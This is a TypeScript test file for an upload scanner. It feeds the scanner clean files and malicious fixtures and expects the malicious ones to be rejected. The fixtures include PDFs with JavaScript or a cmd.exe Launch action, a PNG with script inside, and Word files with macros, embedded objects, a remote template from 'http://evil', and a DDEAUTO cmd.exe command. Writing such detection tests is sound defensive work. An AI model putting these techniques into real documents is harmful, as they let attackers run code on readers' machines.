// Run: npm run test:files. Feeds the upload scanner clean and dangerous files.
import { deflateSync } from 'node:zlib';
import { zipSync, strToU8 } from 'fflate';
import { scanFile } from '../../lib/file-scan.ts';

const EICAR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
const u8 = (s: string) => new Uint8Array(Buffer.from(s, 'latin1'));
const cat = (...p: Uint8Array[]) => new Uint8Array(Buffer.concat(p.map((x) => Buffer.from(x))));
const ct = (main: string, extra = '') => `<?xml version="1.0"?><Types><Override ContentType="application/vnd.openxmlformats-officedocument.${main}+xml"/>${extra}</Types>`;
const docx = (files: Record<string, string>) => zipSync(Object.fromEntries(Object.entries({ '[Content_Types].xml': ct('wordprocessingml.document.main'), 'word/document.xml': '<w:document>Hello</w:document>', ...files }).map(([k, v]) => [k, strToU8(v)])));
const png = cat(new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), u8('IHDR....pixels'));
const hiddenJs = cat(u8('%PDF-1.7\n1 0 obj<</Filter/FlateDecode>>stream\n'), new Uint8Array(deflateSync(Buffer.from('<</S/JavaScript/JS(app.alert(1))>>'))), u8('\nendstream\nendobj\n%%EOF'));

const cases: [string, string, Uint8Array, boolean][] = [
  ['clean PDF', 'plan.pdf', u8('%PDF-1.7\n1 0 obj<</Type/Catalog>>endobj\n%%EOF'), true],
  ['PDF with JavaScript', 'plan.pdf', u8('%PDF-1.7\n<</OpenAction<</S/JavaScript/JS(app.alert(1))>>>>\n%%EOF'), false],
  ['PDF with script hidden in a compressed stream', 'plan.pdf', hiddenJs, false],
  ['PDF that launches a program', 'plan.pdf', u8('%PDF-1.4\n<</S/Launch/F(cmd.exe)>>'), false],
  ['EICAR test virus named .pdf', 'plan.pdf', cat(u8('%PDF-1.4\n'), u8(EICAR)), false],
  ['Windows program renamed to .pdf', 'plan.pdf', u8('MZ\x90\x00 This program cannot be run in DOS mode'), false],
  ['clean PNG', 'logo.png', png, true],
  ['PNG with web code inside', 'logo.png', cat(png, u8('<script>alert(1)</script>')), false],
  ['JPG that is really a PNG', 'photo.jpg', png, false],
  ['old .doc file', 'cv.doc', u8('\xd0\xcf\x11\xe0 old word'), false],
  ['executable', 'setup.exe', u8('MZ'), false],
  ['clean Word .docx', 'plan.docx', docx({}), true],
  ['Word file with macros', 'plan.docx', docx({ 'word/vbaProject.bin': 'Attribute VB_Name' }), false],
  ['Word file with embedded program', 'plan.docx', docx({ 'word/embeddings/oleObject1.bin': 'x' }), false],
  ['Word file loading a remote template', 'plan.docx', docx({ 'word/_rels/settings.xml.rels': '<Relationship Type="attachedTemplate" Target="http://evil/t.dotm" TargetMode="External"/>' }), false],
  ['Word file with DDE command', 'plan.docx', docx({ 'word/document.xml': '<w:instrText>DDEAUTO c:\\windows\\cmd.exe</w:instrText>' }), false],
  ['zip pretending to be .docx', 'plan.docx', zipSync({ 'a.txt': strToU8('hi') }), false],
  ['empty file', 'plan.pdf', new Uint8Array(), false],
];

let failed = 0;
for (const [label, name, bytes, expectOk] of cases) {
  const r = scanFile(name, bytes);
  const pass = r.ok === expectOk;
  if (!pass) failed++;
  console.log(`${pass ? 'PASS' : 'FAIL'} ${label}${r.ok ? '' : ` -> ${r.reason}`}`);
}
console.log(`\n${cases.length - failed}/${cases.length} file checks passed`);
process.exit(failed ? 1 : 0);
